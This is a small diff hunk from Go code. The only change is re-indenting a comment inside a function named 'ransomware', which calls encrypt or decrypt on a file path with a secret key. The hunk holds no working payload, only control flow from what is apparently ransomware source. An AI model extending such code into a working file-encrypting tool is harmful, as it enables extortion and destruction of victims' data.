@@ -77,7 +77,7 @@ func ransomware(filePath string, secretKey []byte) {
 	if !mode {
 		encrypt(filePath, secretKey)
 
-	// if decryption mode
+		// if decryption mode
 	} else {
 		decrypt(filePath, secretKey)
 	}
